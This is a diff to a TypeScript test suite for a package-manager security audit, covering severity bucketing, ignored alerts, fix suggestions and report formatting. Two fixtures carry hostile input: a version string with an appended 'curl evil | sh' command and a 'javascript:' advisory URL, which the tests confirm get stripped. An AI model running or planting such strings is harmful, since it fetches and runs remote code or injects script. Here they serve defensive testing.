@@ -11,11 +11,13 @@ import {
   nonEmptySeverityBuckets,
   formatDependencyBreakdown,
   categoryCounts,
+  scanCoverage,
 } from '../src/audit-helpers.ts'
 import type {
   AuditPackage,
   AuditResult,
 } from '../src/audit-helpers.ts'
+import type { PackageAlert } from '@vltpkg/security-archive'
 
 /** LeveledInsights fixture for malware/severity insights. */
 const leveled = (
@@ -45,6 +47,39 @@ const squatInsights = (
 /** Outbound-edges fixture: an importer's `edgesOut`, one entry per direct dependency. */
 const edgesOutTo = (...deps: { id: string; name?: string }[]) =>
   new Map(deps.map(to => [to.name ?? to.id, { to }]))
+
+/**
+ * Brand a plain fixture so `isNode` from `@vltpkg/graph` accepts it.
+ * `aggregateBySeverity` narrows its `unknown` inputs with `isNode`,
+ * which requires `manifest` plus the `Symbol.toStringTag` brand.
+ * Fixtures that deliberately omit `id` stay invalid under `isNode`, so
+ * the "missing id" cases below still exercise the reject path.
+ */
+const asNode = (o: unknown): unknown =>
+  typeof o === 'object' && o !== null ?
+    {
+      manifest: {},
+      // buildDependencyPath walks edgesIn; an empty map ends the walk
+      // immediately, leaving `path` undefined
+      edgesIn: new Map(),
+      ...o,
+      [Symbol.toStringTag]: '@vltpkg/graph.Node',
+    }
+  : o
+
+/** `aggregateBySeverity`, with the fixtures branded as graph Nodes. */
+const aggregate = (
+  nodes: unknown[],
+  importers: Set<unknown>,
+  warn?: (message: string) => void,
+  securityArchive?: { get?: (depId: string) => unknown },
+) =>
+  aggregateBySeverity(
+    nodes.map(asNode),
+    new Set([...importers].map(asNode)),
+    warn,
+    securityArchive,
+  )
 
 /** AuditPackage fixture, for tests that don't care about identity. */
 const makePkg = (
@@ -247,7 +282,7 @@ t.test('aggregateBySeverity', async t => {
         insights: { severity: leveled({ low: true }) },
       },
     ]
-    const result = aggregateBySeverity(nodes, importers)
+    const result = aggregate(nodes, importers)
     t.equal(result.summary.critical.length, 1)
     t.equal(result.summary.high.length, 1)
     t.equal(result.summary.low.length, 1)
@@ -265,12 +300,15 @@ t.test('aggregateBySeverity', async t => {
           insights: { severity: leveled({ medium: true }) },
         },
       ]
-      const result = aggregateBySeverity(nodes, importers)
+      const result = aggregate(nodes, importers)
       t.equal(result.summary.medium.length, 1)
+      // insights.severity and insights.vuln describe the same CVE data,
+      // so they collapse into a single 'vulnerability' alert rather than
+      // reporting one finding twice
       t.equal(
         result.summary.medium[0]?.alerts[0]?.type,
-        'severity',
-        'alert type should be severity',
+        'vulnerability',
+        'severity insights surface as a vulnerability alert',
       )
     },
   )
@@ -287,7 +325,7 @@ t.test('aggregateBySeverity', async t => {
         },
       },
     ]
-    const result = aggregateBySeverity(nodes, importers)
+    const result = aggregate(nodes, importers)
     t.strictSame(result.summary.high[0]?.cves, [
       'CVE-2021-1234',
       'CVE-2021-5678',
@@ -303,7 +341,7 @@ t.test('aggregateBySeverity', async t => {
         insights: { severity: leveled({ high: true }) },
       },
     ]
-    const result = aggregateBySeverity(nodes, importers)
+    const result = aggregate(nodes, importers)
     t.strictSame(result.summary.high[0]?.cves, [])
   })
 
@@ -328,7 +366,7 @@ t.test('aggregateBySeverity', async t => {
       id: 'importer-1',
       edgesOut: edgesOutTo(directNode),
     }
-    const result = aggregateBySeverity(
+    const result = aggregate(
       [directNode, transitiveNode],
       new Set([scopedImporter]),
     )
@@ -351,7 +389,7 @@ t.test('aggregateBySeverity', async t => {
           insights: { malware: leveled({ high: true }) },
         },
       ]
-      const result = aggregateBySeverity(nodes, importers)
+      const result = aggregate(nodes, importers)
       t.equal(result.directCount, 1)
       t.equal(result.summary.high[0]?.direct, true)
     },
@@ -368,7 +406,7 @@ t.test('aggregateBySeverity', async t => {
           insights: { malware: leveled({ high: true }) },
         },
       ]
-      const result = aggregateBySeverity(nodes, importers)
+      const result = aggregate(nodes, importers)
       t.equal(result.directCount, 0)
       t.equal(result.indirectCount, 1)
       t.equal(result.summary.high[0]?.direct, false)
@@ -380,12 +418,142 @@ t.test('aggregateBySeverity', async t => {
       { name: 'clean-pkg', version: '1.0.0' },
       { name: 'another-clean', version: '2.0.0', insights: {} },
     ]
-    const result = aggregateBySeverity(nodes, importers)
+    const result = aggregate(nodes, importers)
     t.equal(result.total, 0)
   })
 
+  t.test('does not report alerts the feed marks ignore', async t => {
+    const archive = {
+      get: () => ({
+        alerts: [
+          {
+            key: '1',
+            type: 'envVars',
+            severity: 'low',
+            category: 'supplyChainRisk',
+            action: 'ignore',
+          },
+          {
+            key: '2',
+            type: 'cve',
+            severity: 'high',
+            category: 'vulnerability',
+            action: 'monitor',
+          },
+        ],
+      }),
+    }
+    const nodes = [
+      {
+        id: 'mixed-id',
+        name: 'mixed-pkg',
+        version: '1.0.0',
+        insights: { scanned: true },
+      },
+    ]
+    const result = aggregate(nodes, importers, undefined, archive)
+    t.equal(result.total, 1)
+    t.equal(result.summary.high.length, 1, 'graded by the kept alert')
+    t.strictSame(
+      result.summary.high[0]?.alerts.map(a => a.type),
+      ['cve'],
+      'the ignored alert is gone entirely, not just unrendered',
+    )
+  })
+
+  t.test('drops a package whose every alert is ignored', async t => {
+    const archive = {
+      get: () => ({
+        alerts: [
+          {
+            key: '1',
+            type: 'networkAccess',
+            severity: 'middle',
+            category: 'supplyChainRisk',
+            action: 'ignore',
+          },
+        ],
+      }),
+    }
+    const nodes = [
+      {
+        id: 'noisy-id',
+        name: 'noisy-pkg',
+        version: '1.0.0',
+        insights: { scanned: true },
+      },
+    ]
+    t.equal(
+      aggregate(nodes, importers, undefined, archive).total,
+      0,
+      'not a finding at all',
+    )
+  })
+
+  t.test(
+    'an unrecognized severity does not silently become low',
+    async t => {
+      const archiveWith = (alert: Record<string, unknown>) => ({
+        get: () => ({ alerts: [alert] }),
+      })
+      const nodes = [
+        {
+          id: 'weird-id',
+          name: 'weird-pkg',
+          version: '1.0.0',
+          insights: { scanned: true },
+        },
+      ]
+
+      // Malware is severe whatever the feed calls it. Filed low it would
+      // be dropped by --audit-level=high and the command would exit 0.
+      const warnings: string[] = []
+      const malware = aggregate(
+        nodes,
+        importers,
+        m => warnings.push(m),
+        archiveWith({
+          key: '1',
+          type: 'malware',
+          severity: 'moderate',
+          category: 'supplyChainRisk',
+        }),
+      )
+      t.equal(malware.summary.critical.length, 1)
+      t.equal(malware.summary.low.length, 0)
+      t.match(
+        warnings.join('\n'),
+        /unrecognized severity "moderate" on malware alert/,
+        'and says so rather than doing it quietly',
+      )
+      t.equal(
+        filterAuditResult(malware, 'high').total,
+        1,
+        'so --audit-level=high still reports it',
+      )
+
+      // A non-malware finding has no such claim to make, so it lands low
+      const other = aggregate(
+        nodes,
+        importers,
+        () => {},
+        archiveWith({
+          key: '1',
+          type: 'networkAccess',
+          severity: 'Critical',
+          category: 'supplyChainRisk',
+        }),
+      )
+      t.equal(
+        other.summary.low.length,
+        1,
+        'an unrecognized severity elsewhere is treated as low',
+      )
+    },
+  )
+
   t.test('handles empty input', async t => {
-    const result = aggregateBySeverity([], importers)
+    const result = aggregate([], importers)
     t.equal(result.total, 0)
     t.equal(result.directCount, 0)
     t.equal(result.indirectCount, 0)
@@ -406,7 +574,7 @@ t.test('aggregateBySeverity', async t => {
           insights: { malware: leveled({ high: true }) },
         },
       ]
-      const result = aggregateBySeverity(nodes, malformedImporters)
+      const result = aggregate(nodes, malformedImporters)
       t.equal(result.directCount, 1)
       t.equal(result.summary.high[0]?.direct, true)
     },
@@ -421,7 +589,7 @@ t.test('aggregateBySeverity', async t => {
         insights: { squat: squatInsights({ critical: true }) },
       },
     ]
-    const result = aggregateBySeverity(nodes, importers)
+    const result = aggregate(nodes, importers)
     t.equal(result.summary.critical.length, 1)
     t.ok(result.summary.critical[0])
     t.equal(result.summary.critical[0]!.alerts[0]?.type, 'squatting')
@@ -436,7 +604,7 @@ t.test('aggregateBySeverity', async t => {
         insights: { squat: squatInsights({ medium: true }) },
       },
     ]
-    const result = aggregateBySeverity(nodes, importers)
+    const result = aggregate(nodes, importers)
     t.equal(result.summary.medium.length, 1)
     t.ok(result.summary.medium[0])
     t.equal(result.summary.medium[0]!.alerts[0]?.type, 'squatting')
@@ -453,7 +621,7 @@ t.test('aggregateBySeverity', async t => {
           insights: { malware: leveled() },
         },
       ]
-      const result = aggregateBySeverity(nodes, importers)
+      const result = aggregate(nodes, importers)
       t.equal(result.total, 0)
     },
   )
@@ -469,7 +637,7 @@ t.test('aggregateBySeverity', async t => {
           insights: { squat: squatInsights() },
         },
       ]
-      const result = aggregateBySeverity(nodes, importers)
+      const result = aggregate(nodes, importers)
       t.equal(result.total, 0)
     },
   )
@@ -488,7 +656,7 @@ t.test('aggregateBySeverity', async t => {
         },
       ]
       // no warn callback passed -- exercises the default `() => {}`
-      const result = aggregateBySeverity(nodes, importers)
+      const result = aggregate(nodes, importers)
       t.equal(result.total, 0)
     },
   )
@@ -518,7 +686,7 @@ t.test('aggregateBySeverity', async t => {
       // has insights, but no id
       { insights: { malware: leveled({ critical: true }) } },
     ]
-    const result = aggregateBySeverity(nodes, importers, message =>
+    const result = aggregate(nodes, importers, message =>
       warnings.push(message),
     )
     t.equal(result.total, 0)
@@ -538,9 +706,7 @@ t.test('aggregateBySeverity', async t => {
         { id: 'clean-id', insights: {} },
         { id: 'no-alerts-id', insights: { malware: leveled() } },
       ]
-      aggregateBySeverity(nodes, importers, message =>
-        warnings.push(message),
-      )
+      aggregate(nodes, importers, message => warnings.push(message))
       t.equal(warnings.length, 0)
     },
   )
@@ -560,18 +726,88 @@ t.test('aggregateBySeverity', async t => {
           },
         },
       ]
-      const result = aggregateBySeverity(nodes, importers)
+      const result = aggregate(nodes, importers)
       t.equal(result.total, 1)
       t.equal(result.summary.critical.length, 1)
       t.equal(result.summary.high.length, 0)
       const pkg = result.summary.critical[0]
       t.ok(pkg)
       t.equal(pkg!.alerts.length, 3)
-      t.equal(pkg!.alerts[0]?.type, 'malware')
-      t.equal(pkg!.alerts[1]?.type, 'severity')
-      t.equal(pkg!.alerts[2]?.type, 'squatting')
+      t.strictSame(
+        pkg!.alerts.map(a => a.type).sort(),
+        ['malware', 'squatting', 'vulnerability'],
+        'one alert per distinct finding, severity folded into vulnerability',
+      )
     },
   )
+
+  t.test(
+    'folds severity and vuln insights into one alert at the worse level',
+    async t => {
+      // `severity` and `vuln` describe the same CVE data, so a single
+      // vulnerability sets both. Emitting one alert per insight would
+      // report it twice and double the vulnerable count.
+      for (const [severity, vuln, expected] of [
+        [
+          leveled({ high: true }),
+          leveled({ critical: true }),
+          'critical',
+        ],
+        [
+          leveled({ critical: true }),
+          leveled({ high: true }),
+          'critical',
+        ],
+        [leveled({ low: true }), leveled({ low: true }), 'low'],
+      ] as const) {
+        const result = aggregate(
+          [
+            {
+              id: 'both-id',
+              name: 'both',
+              insights: { severity, vuln },
+            },
+          ],
+          importers,
+        )
+        t.equal(result.total, 1)
+        const pkg = result.summary[expected][0]
+        t.ok(pkg, `bucketed as ${expected}`)
+        t.strictSame(
+          pkg?.alerts.map(a => a.type),
+          ['vulnerability'],
+          'one alert, not one per insight',
+        )
+      }
+    },
+  )
+
+  t.test('warns for malformed vuln insights', async t => {
+    const warnings: string[] = []
+    // fails isLeveledInsights: missing the "critical" key
+    const result = aggregate(
+      [
+        {
+          id: 'malformed-vuln-id',
+          insights: {
+            vuln: { low: false, medium: false, high: false },
+          },
+        },
+      ],
+      importers,
+      message => warnings.push(message),
+    )
+    t.equal(
+      result.total,
+      0,
+      'the malformed category yields no alerts',
+    )
+    t.equal(warnings.length, 1)
+    t.match(
+      warnings[0],
+      /malformed vuln insights for malformed-vuln-id/,
+    )
+  })
 
   t.test('defaults name and version when missing', async t => {
     const nodes = [
@@ -580,7 +816,7 @@ t.test('aggregateBySeverity', async t => {
         insights: { malware: leveled({ critical: true }) },
       },
     ]
-    const result = aggregateBySeverity(nodes, importers)
+    const result = aggregate(nodes, importers)
     t.equal(result.summary.critical.length, 1)
     t.equal(result.summary.critical[0]?.name, 'unknown')
     t.equal(result.summary.critical[0]?.version, 'unknown')
@@ -640,6 +876,62 @@ t.test('filterAuditResult', async t => {
     t.equal(low.directCount, 2)
     t.equal(low.indirectCount, 2)
   })
+
+  t.test(
+    'keeps an actively exploited finding below the threshold',
+    async t => {
+      const exploited = makePkg({
+        name: 'exploited-pkg',
+        alerts: [
+          {
+            key: '1',
+            type: 'cve',
+            severity: 'low',
+            category: 'vulnerability',
+            props: {
+              lastPublish: '2026-01-01',
+              kevs: [{ id: 'CVE-2026-0001' }],
+            },
+          },
+        ],
+        direct: true,
+      })
+      const result = makeResult({
+        summary: {
+          ...emptySummary(),
+          low: [exploited, makePkg({ name: 'quiet-pkg' })],
+        },
+        total: 2,
+        directCount: 1,
+        indirectCount: 1,
+      })
+
+      const critical = filterAuditResult(result, 'critical')
+      t.equal(
+        critical.total,
+        1,
+        'the exploited finding survives a critical threshold',
+      )
+      t.equal(critical.summary.low.length, 1)
+      t.equal(
+        critical.summary.low[0]?.name,
+        'exploited-pkg',
+        'and the unexploited low finding is still dropped',
+      )
+      t.equal(
+        critical.directCount,
+        1,
+        'counts are recomputed from what survived',
+      )
+      t.equal(critical.indirectCount, 0)
+      // severity is left exactly as the feed graded it
+      t.equal(
+        critical.summary.critical.length,
+        0,
+        'it is not promoted out of its graded bucket',
+      )
+    },
+  )
 
   t.test('preserves empty result structure', async t => {
     const filtered = filterAuditResult(makeResult(), 'high')
@@ -713,7 +1005,7 @@ t.test('categoryCounts', async t => {
                   key: '1',
                   type: 'malware',
                   severity: 'critical',
-                  category: 'malware',
+                  category: 'supplyChainRisk',
                 },
               ],
             }),
@@ -726,13 +1018,13 @@ t.test('categoryCounts', async t => {
                   key: '2',
                   type: 'severity',
                   severity: 'high',
-                  category: 'severity',
+                  category: 'vulnerability',
                 },
                 {
                   key: '3',
                   type: 'squatting',
                   severity: 'high',
-                  category: 'squat',
+                  category: 'supplyChainRisk',
                 },
               ],
             }),
@@ -744,8 +1036,8 @@ t.test('categoryCounts', async t => {
                 {
                   key: '4',
                   type: 'squatting',
-                  severity: 'medium',
-                  category: 'squat',
+                  severity: 'middle',
+                  category: 'supplyChainRisk',
                 },
               ],
             }),
@@ -757,6 +1049,49 @@ t.test('categoryCounts', async t => {
         vulnerable: 1,
         squat: 2,
       })
+    },
+  )
+
+  t.test(
+    'a package counts once per category, not once per alert',
+    async t => {
+      const result = makeResult({
+        summary: {
+          ...emptySummary(),
+          high: [
+            makePkg({
+              name: 'many-cves',
+              alerts: [
+                {
+                  key: '1',
+                  type: 'cve',
+                  severity: 'high',
+                  category: 'vulnerability',
+                },
+                {
+                  key: '2',
+                  type: 'cve',
+                  severity: 'high',
+                  category: 'vulnerability',
+                },
+                {
+                  key: '3',
+                  type: 'mediumCVE',
+                  severity: 'middle',
+                  category: 'vulnerability',
+                },
+              ],
+            }),
+          ],
+        },
+        total: 1,
+        indirectCount: 1,
+      })
+      t.equal(
+        categoryCounts(result).vulnerable,
+        1,
+        'three vulnerability alerts on one package count once',
+      )
     },
   )
 
@@ -809,7 +1144,7 @@ t.test('formatAuditSummary', async t => {
                 key: '1',
                 type: 'malware',
                 severity: 'high',
-                category: 'malware',
+                category: 'supplyChainRisk',
               },
             ],
             direct: true,
@@ -821,15 +1156,672 @@ t.test('formatAuditSummary', async t => {
       indirectCount: 0,
     })
     const output = formatAuditSummary(result)
-    t.match(output, /^1 package with security issues\n/)
+    t.match(output, /^1 package with security issues$/m)
     t.match(output, /^1 malware$/m)
     t.match(output, /^1 high$/m)
     t.match(output, /high\s+pkg-a@1\.0\.0\s+malware: high/)
     t.match(output, /1 direct dependency, 0 transitive/)
+    // the counts are the conclusion of the report, so they land after
+    // the findings rather than scrolling off the top of a long one
     t.ok(
-      output.indexOf('1 direct dependency') <
-        output.indexOf('pkg-a@1.0.0'),
-      'direct/transitive breakdown renders before the rows',
+      output.indexOf('pkg-a@1.0.0') <
+        output.indexOf('1 package with security issues'),
+      'summary renders after the findings',
+    )
+    t.ok(
+      output.indexOf('1 package with security issues') <
+        output.indexOf('1 direct dependency'),
+      'direct/transitive breakdown closes the summary',
+    )
+  })
+
+  t.test(
+    'labels alerts in plain English rather than feed type names',
+    async t => {
+      const result = makeResult({
+        summary: {
+          ...emptySummary(),
+          medium: [
+            makePkg({
+              name: 'risky',
+              alerts: [
+                {
+                  key: '1',
+                  type: 'urlStrings',
+                  severity: 'low',
+                  category: 'supplyChainRisk',
+                },
+                {
+                  key: '2',
+                  type: 'envVars',
+                  // the feed spells medium "middle"
+                  severity: 'middle',
+                  category: 'supplyChainRisk',
+                },
+                {
+                  key: '3',
+                  type: 'mediumCVE',
+                  severity: 'middle',
+                  category: 'vulnerability',
+                },
+              ],
+            }),
+          ],
+        },
+        total: 1,
+        directCount: 0,
+        indirectCount: 1,
+      })
+      const output = formatAuditSummary(result)
+      t.match(output, /embedded URL: low/, 'urlStrings is relabelled')
+      t.match(
+        output,
+        /reads environment variables: medium/,
+        'envVars is relabelled and middle reads as medium',
+      )
+      t.match(
+        output,
+        /vulnerability: medium/,
+        'the CVE grade in the type name is not repeated as a label',
+      )
+      t.notMatch(
+        output,
+        /urlStrings|envVars|mediumCVE|middle/,
+        'no feed vocabulary reaches the user',
+      )
+    },
+  )
+
+  t.test(
+    'reports a fix per finding, scoped to direct vs transitive',
+    async t => {
+      const vulnAlert = (
+        overrides: Record<string, unknown> = {},
+      ) => ({
+        key: '1',
+        type: 'cve' as const,
+        severity: 'high' as const,
+        category: 'vulnerability' as const,
+        props: {
+          lastPublish: '2026-01-01',
+          firstPatchedVersionIdentifier: '2.0.0',
+          ...overrides,
+        },
+      })
+
+      const direct = formatAuditSummary(
+        makeResult({
+          summary: {
+            ...emptySummary(),
+            high: [
+              makePkg({
+                name: 'direct-pkg',
+                alerts: [vulnAlert()],
+                direct: true,
+              }),
+            ],
+          },
+          total: 1,
+          directCount: 1,
+        }),
+      )
+      t.match(
+        direct,
+        /fix: vlt install direct-pkg@2\.0\.0/,
+        'a direct dependency can be upgraded in place',
+      )
+      t.notMatch(
+        direct,
+        />=/,
+        'pins the patched version rather than allowing any later major',
+      )
+
+      const transitive = formatAuditSummary(
+        makeResult({
+          summary: {
+            ...emptySummary(),
+            high: [
+              makePkg({
+                name: 'deep-pkg',
+                alerts: [vulnAlert()],
+                path: 'root > mid-pkg > deep-pkg',
+                pathCount: 1,
+              }),
+            ],
+          },
+          total: 1,
+          indirectCount: 1,
+        }),
+      )
+      t.match(
+        transitive,
+        /patched in 2\.0\.0/,
+        'the patched version is still reported for a transitive dep',
+      )
+      t.match(
+        transitive,
+        /via root > mid-pkg > deep-pkg/,
+        'the route to the package is reported',
+      )
+      t.notMatch(
+        transitive,
+        /vlt install deep-pkg/,
+        'does not tell the user to install a package they never asked for',
+      )
+      t.notMatch(
+        transitive,
+        /fix: update mid-pkg/,
+        'does not assert a parent upgrade we have not verified exists',
+      )
+
+      const unfixed = formatAuditSummary(
+        makeResult({
+          summary: {
+            ...emptySummary(),
+            high: [
+              makePkg({
+                name: 'unfixed-pkg',
+                alerts: [
+                  {
+                    key: '1',
+                    type: 'cve',
+                    severity: 'high',
+                    category: 'vulnerability',
+                  },
+                ],
+              }),
+            ],
+          },
+          total: 1,
+          indirectCount: 1,
+        }),
+      )
+      t.match(
+        unfixed,
+        /fix: none available yet/,
+        'a vulnerability with no patched release says so',
+      )
+
+      const noPatchExpected = formatAuditSummary(
+        makeResult({
+          summary: {
+            ...emptySummary(),
+            low: [
+              makePkg({
+                name: 'chatty-pkg',
+                alerts: [
+                  {
+                    key: '1',
+                    type: 'networkAccess',
+                    severity: 'low',
+                    category: 'supplyChainRisk',
+                  },
+                ],
+              }),
+            ],
+          },
+          total: 1,
+          indirectCount: 1,
+        }),
+      )
+      t.notMatch(
+        noPatchExpected,
+        /fix:/,
+        'a non-vulnerability finding has no patch to wait for',
+      )
+    },
+  )
+
+  t.test(
+    'reports every route to a shared package, not just one',
+    async t => {
+      const output = formatAuditSummary(
+        makeResult({
+          summary: {
+            ...emptySummary(),
+            high: [
+              makePkg({
+                name: 'shared-pkg',
+                alerts: [
+                  {
+                    key: '1',
+                    type: 'cve',
+                    severity: 'high',
+                    category: 'vulnerability',
+                  },
+                ],
+                path: 'root > a > shared-pkg',
+                pathCount: 2,
+              }),
+            ],
+          },
+          total: 1,
+          indirectCount: 1,
+        }),
+      )
+      t.match(
+        output,
+        /reached by 2 paths/,
+        'a shared package reports how many routes reach it',
+      )
+      t.notMatch(
+        output,
+        /root > a > shared-pkg/,
+        'and does not list them -- that belongs behind its own command',
+      )
+    },
+  )
+
+  t.test('suggests the intended package for a typosquat', async t => {
+    const output = formatAuditSummary(
+      makeResult({
+        summary: {
+          ...emptySummary(),
+          medium: [
+            makePkg({
+              name: 'cache-control-parser',
+              alerts: [
+                {
+                  key: '1',
+                  type: 'gptDidYouMean',
+                  severity: 'middle',
+                  category: 'supplyChainRisk',
+                  props: {
+                    lastPublish: '2026-01-01',
+                    alternatePackage: 'parse-cache-control',
+                  },
+                },
+              ],
+            }),
+          ],
+        },
+        total: 1,
+        indirectCount: 1,
+      }),
+    )
+    t.match(output, /possible typosquat \(AI-flagged\): medium/)
+    t.match(output, /did you mean parse-cache-control\?/)
+  })
+
+  t.test(
+    'reports whether a patch is reachable from declared ranges',
+    async t => {
+      const transitive = (
+        dependents: { name: string; range?: string }[],
+      ) =>
+        formatAuditSummary(
+          makeResult({
+            summary: {
+              ...emptySummary(),
+              high: [
+                makePkg({
+                  name: 'deep-pkg',
+                  alerts: [
+                    {
+                      key: '1',
+                      type: 'cve',
+                      severity: 'high',
+                      category: 'vulnerability',
+                      props: {
+                        lastPublish: '2026-01-01',
+                        firstPatchedVersionIdentifier: '2.0.0',
+                      },
+                    },
+                  ],
+                  dependents,
+                }),
+              ],
+            },
+            total: 1,
+            indirectCount: 1,
+          }),
+        )
+
+      t.match(
+        transitive([{ name: 'mid', range: '>=1.5.0' }]),
+        /reachable: mid declares >=1\.5\.0, so `vlt install` picks up 2\.0\.0/,
+        'a range that admits the patch is reachable',
+      )
+      t.match(
+        transitive([{ name: 'mid', range: '^1.5.0' }]),
+        /blocked: mid declares \^1\.5\.0/,
+        'a caret pins the major, so a 2.x patch is out of range',
+      )
+      t.match(
+        transitive([
+          { name: 'a', range: '^2.0.0' },
+          { name: 'b', range: '>=1.0.0' },
+        ]),
+        /reachable: all 2 dependents' ranges allow it/,
+        'several permitting dependents collapse to a count',
+      )
+      t.match(
+        transitive([{ name: 'pinner', range: '1.0.0' }]),
+        /blocked: pinner declares 1\.0\.0 -- the range must widen/,
+        'a pin blocks the patch',
+      )
+      t.match(
+        transitive([
+          { name: 'pinner', range: '1.0.0' },
+          { name: 'ok', range: '^2.0.0' },
+        ]),
+        /partly blocked: pinner declares 1\.0\.0/,
+        'a mix names only the blockers',
+      )
+      t.match(
+        transitive([{ name: 'gitdep' }]),
+        /patched in 2\.0\.0; its dependents declare no version range/,
+        'a specifier with no range says nothing about published versions',
+      )
+    },
+  )
+
+  t.test('reports scan coverage over the graph', async t => {
+    const withCoverage = (scanned: number, unscanned: number) =>
+      formatAuditSummary(
+        makeResult({
+          summary: {
+            ...emptySummary(),
+            high: [makePkg({ name: 'p' })],
+          },
+          total: 1,
+          indirectCount: 1,
+          scannedCount: scanned,
+          unscannedCount: unscanned,
+        }),
+      )
+
+    t.match(
+      withCoverage(238, 2),
+      /238 of 240 installed versions scanned -- 2 unscanned, so findings may be incomplete/,
+    )
+    t.match(
+      withCoverage(240, 0),
+      /^240 of 240 installed versions scanned$/m,
+      'nothing unscanned drops the caveat',
+    )
+    t.match(
+      withCoverage(1, 0),
+      /1 of 1 installed version scanned/,
+      'singular',
+    )
+    t.notMatch(
+      withCoverage(0, 0),
+      /installed version/,
+      'no coverage information means no line',
+    )
+    t.notMatch(
+      formatAuditSummary(
+        makeResult({
+          summary: {
+            ...emptySummary(),
+            high: [makePkg({ name: 'p' })],
+          },
+          total: 1,
+        }),
+      ),
+      /installed version/,
+      'and an unknown count renders nothing rather than NaN',
+    )
+  })
+
+  t.test(
+    'flags an actively exploited vulnerability from kevs',
+    async t => {
+      const output = formatAuditSummary(
+        makeResult({
+          summary: {
+            ...emptySummary(),
+            critical: [
+              makePkg({
+                name: 'exploited-pkg',
+                alerts: [
+                  {
+                    key: '1',
+                    type: 'cve',
+                    severity: 'critical',
+                    category: 'vulnerability',
+                    props: {
+                      lastPublish: '2026-01-01',
+                      cveId: 'CVE-2026-0001',
+                      kevs: [{ id: 'CVE-2026-0001' }],
+                    },
+                  },
+                ],
+              }),
+            ],
+          },
+          total: 1,
+          indirectCount: 1,
+        }),
+      )
+      t.match(
+        output,
+        /actively exploited/,
+        'badged on the finding line',
+      )
+      t.match(
+        output,
+        /^1 actively exploited$/m,
+        'and counted in the summary so it cannot be scrolled past',
+      )
+    },
+  )
+
+  t.test(
+    'styles the actively exploited badge when colors is true',
+    async t => {
+      const result = makeResult({
+        summary: {
+          ...emptySummary(),
+          critical: [
+            makePkg({
+              name: 'exploited-pkg',
+              alerts: [
+                {
+                  key: '1',
+                  type: 'cve',
+                  severity: 'critical',
+                  category: 'vulnerability',
+                  props: {
+                    lastPublish: '2026-01-01',
+                    cveId: 'CVE-2026-0001',
+                    kevs: [{ id: 'CVE-2026-0001' }],
+                  },
+                },
+              ],
+            }),
+          ],
+        },
+        total: 1,
+        indirectCount: 1,
+      })
+      // styleText is a no-op on a non-TTY, so this asserts the badge
+      // still renders on the colored path rather than that it differs
+      t.match(
+        formatAuditSummary(result, { colors: true }),
+        /actively exploited/,
+        'the text survives styling',
+      )
+    },
+  )
+
+  /** Render one alert on one critical package. */
+  const renderAlert = (
+    alert: PackageAlert,
+    pkg: Partial<AuditPackage> = {},
+  ) =>
+    formatAuditSummary(
+      makeResult({
+        summary: {
+          ...emptySummary(),
+          critical: [makePkg({ alerts: [alert], ...pkg })],
+        },
+        total: 1,
+        indirectCount: 1,
+      }),
+    )
+
+  t.test('renders the advisory title and affected range', async t => {
+    const output = renderAlert({
+      key: '1',
+      type: 'cve',
+      severity: 'critical',
+      category: 'vulnerability',
+      props: {
+        lastPublish: '2026-01-01',
+        title: 'Prototype pollution in deepmerge',
+        vulnerableVersionRange: '>=1.0.0 <2.0.0',
+        firstPatchedVersionIdentifier: '2.0.0',
+      },
+    })
+    t.match(output, /Prototype pollution in deepmerge/, 'the title')
+    t.match(
+      output,
+      /affects >=1\.0\.0 <2\.0\.0 -- patched in 2\.0\.0/,
+      'range and fixed version on one line, separate from the title',
+    )
+    t.notMatch(
+      output,
+      /description/,
+      'and never the description, which runs to paragraphs',
+    )
+  })
+
+  t.test(
+    'omits a patched version that is not valid semver',
+    async t => {
+      // this string reaches a copy-pasteable command, so anything that
+      // is not a version must not survive to be suggested
+      const output = renderAlert(
+        {
+          key: '1',
+          type: 'cve',
+          severity: 'critical',
+          category: 'vulnerability',
+          props: {
+            lastPublish: '2026-01-01',
+            firstPatchedVersionIdentifier: '1.0.1 && curl evil | sh',
+          },
+        },
+        { direct: true },
+      )
+      t.notMatch(
+        output,
+        /curl evil/,
+        'the injected command is dropped',
+      )
+      t.notMatch(
+        output,
+        /patched in/,
+        'and no fixed version is claimed',
+      )
+      t.match(
+        output,
+        /fix: none available yet/,
+        'so the finding reports having no fix',
+      )
+    },
+  )
+
+  t.test(
+    'reports the version instead of a command for an invalid package name',
+    async t => {
+      const output = renderAlert(
+        {
+          key: '1',
+          type: 'cve',
+          severity: 'critical',
+          category: 'vulnerability',
+          props: {
+            lastPublish: '2026-01-01',
+            firstPatchedVersionIdentifier: '2.0.0',
+          },
+        },
+        { name: 'Not A Package Name', direct: true },
+      )
+      t.match(
+        output,
+        /fix: upgrade to 2\.0\.0/,
+        'no vlt install command is offered',
+      )
+      t.notMatch(output, /vlt install/, 'nothing to copy and paste')
+    },
+  )
+
+  t.test(
+    'labels an unrecognized alert type with its raw type',
+    async t => {
+      // the feed adds alert types faster than the label table tracks them
+      t.match(
+        renderAlert({
+          key: '1',
+          type: 'someBrandNewAlertType',
+          severity: 'critical',
+          category: 'supplyChainRisk',
+        }),
+        /someBrandNewAlertType: critical/,
+        'reported rather than silently dropped',
+      )
+    },
+  )
+
+  t.test(
+    'shows an unusable severity rather than hiding it',
+    async t => {
+      t.match(
+        renderAlert({
+          key: '1',
+          type: 'cve',
+          severity: 'catastrophic' as PackageAlert['severity'],
+          category: 'vulnerability',
+        }),
+        /vulnerability: catastrophic/,
+        'an unrecognized severity is shown as the feed spelled it',
+      )
+      t.match(
+        renderAlert({
+          key: '1',
+          type: 'cve',
+          category: 'vulnerability',
+        }),
+        /vulnerability: unknown/,
+        'and a missing one reads as unknown',
+      )
+    },
+  )
+
+  t.test(
+    'drops a non-http advisory url instead of linking it',
+    async t => {
+      // a terminal supporting OSC 8 hands the target to the OS opener
+      const output = renderAlert({
+        key: '1',
+        type: 'cve',
+        severity: 'critical',
+        category: 'vulnerability',
+        props: {
+          lastPublish: '2026-01-01',
+          url: 'javascript:alert(1)',
+        },
+      })
+      t.notMatch(output, /javascript:/, 'the scheme is not rendered')
+    },
+  )
+
+  t.test('reports a truncated path count as approximate', async t => {
+    t.match(
+      renderAlert(
+        {
+          key: '1',
+          type: 'malware',
+          severity: 'critical',
+          category: 'supplyChainRisk',
+        },
+        { pathCount: 5, pathCountTruncated: true },
+      ),
+      /reached by 5\+ paths/,
+      'the + marks the count as a floor, not a total',
     )
   })
 
@@ -846,7 +1838,7 @@ t.test('formatAuditSummary', async t => {
                 key: '1',
                 type: 'severity',
                 severity: 'high',
-                category: 'severity',
+                category: 'vulnerability',
               },
             ],
             cves: ['CVE-2021-1234'],
@@ -880,7 +1872,7 @@ t.test('formatAuditSummary', async t => {
